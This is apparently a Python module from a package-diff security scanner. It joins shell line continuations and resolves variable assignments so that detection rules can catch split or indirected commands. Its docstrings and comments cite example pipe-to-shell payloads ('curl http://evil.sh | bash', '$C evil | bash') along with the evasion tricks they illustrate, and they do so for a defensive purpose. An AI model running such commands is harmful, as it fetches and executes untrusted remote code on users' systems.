import re


def join_line_continuations(lines: list[str]) -> list[str]:
    """Join shell line continuations into single logical lines.

    Rules are matched one line at a time, so a command split with a
    trailing backslash slips past any pattern that has to see the whole
    pipeline::

        curl \\
          http://evil.sh | bash

    Without this, the CRITICAL "pipe to shell" rules see only ``curl \\``
    and the payload arrives as an unrelated fragment.  Only lines
    carrying the same diff marker are joined, so an addition is never
    spliced onto a removal.
    """
    out: list[str] = []
    buf: str | None = None
    marker = ""
    for line in lines:
        this_marker = line[0] if line[:1] in ("+", "-") else ""
        body = line[1:] if this_marker else line
        if buf is not None and this_marker == marker:
            buf = f"{buf} {body.strip()}"
        else:
            if buf is not None:
                out.append(marker + buf)
            buf, marker = body, this_marker
        if buf.rstrip().endswith("\\"):
            buf = buf.rstrip()[:-1].rstrip()
        else:
            out.append(marker + buf)
            buf, marker = None, ""
    if buf is not None:
        out.append(marker + buf)
    return out


# Assignments are frequently indented (every one inside a function body
# is) and may be introduced by a declaration keyword.  Anchoring on the
# bare name meant the variable table stayed empty for function bodies,
# so `C=curl; $C evil | bash` never resolved and defeated every rule
# that matches resolved strings.
_ASSIGNMENT_RE = re.compile(
    r"^\s*(?:(?:local|export|declare|readonly|typeset)\s+)?(\w+)\s*=\s*(.+)"
)


_VAR_REF_RE = re.compile(r"\$\{(\w+)\}|\$(\w+)")


def _substitute(text: str, var_table: dict[str, str]) -> str:
    def replacer(match: re.Match) -> str:
        var = match.group(1) or match.group(2)
        return var_table.get(var, match.group(0))

    return _VAR_REF_RE.sub(replacer, text)


def _variable_table(additions: list[str]) -> dict[str, str]:
    """Resolve assignments among added lines into ``{name: value}``."""
    var_table: dict[str, str] = {}
    for line in additions:
        match = _ASSIGNMENT_RE.match(line)
        if not match:
            continue
        value = match.group(2).strip()
        if (value.startswith('"') and value.endswith('"')) or (
            value.startswith("'") and value.endswith("'")
        ):
            value = value[1:-1]
        # A command substitution has no static value, so it cannot be
        # folded into the table.
        if "$(" not in value and "`" not in value:
            var_table[match.group(1)] = value

    for _ in range(10):
        new_table = {k: _substitute(v, var_table) for k, v in var_table.items()}
        if new_table == var_table:
            break
        var_table = new_table
    return var_table


def resolve_added_lines(diff_text: str) -> list[str]:
    """Diff lines with each added line replaced by its resolved form.

    Order and count are preserved, so callers can still map a line back to
    its enclosing function via
    :func:`~trustsight.rules._classify_enclosing_function`.  Rules scoped to
    ``build()`` or ``pkgver()`` need that positional information.

    Substitution is applied per line rather than by zipping against
    :func:`tokenize_and_resolve`, whose output omits assignment lines: any
    added assignment made the two sequences different lengths and shifted
    every following line onto the wrong position.
    """
    lines = join_line_continuations(diff_text.splitlines())
    var_table = _variable_table(
        [ln[1:] for ln in lines if ln.startswith("+") and ln[1:].strip()]
    )
    return [
        "+" + _substitute(line[1:], var_table) if line.startswith("+") else line
        for line in lines
    ]


def tokenize_and_resolve(diff_text: str) -> tuple[list[str], list[str]]:
    additions = []
    for line in join_line_continuations(diff_text.splitlines()):
        if line.startswith("+"):
            content = line[1:]
            if content.strip():
                additions.append(content)

    var_table = _variable_table(additions)

    # An assignment whose value is statically known contributes its value
    # to the table rather than a command line to match against; anything
    # else is a candidate for resolution.
    unresolved_candidates = [
        line for line in additions
        if not (
            (m := _ASSIGNMENT_RE.match(line))
            and "$(" not in m.group(2)
            and "`" not in m.group(2)
        )
    ]

    resolved = [_substitute(line, var_table) for line in unresolved_candidates]
    return resolved, [u for u in unresolved_candidates if u not in resolved]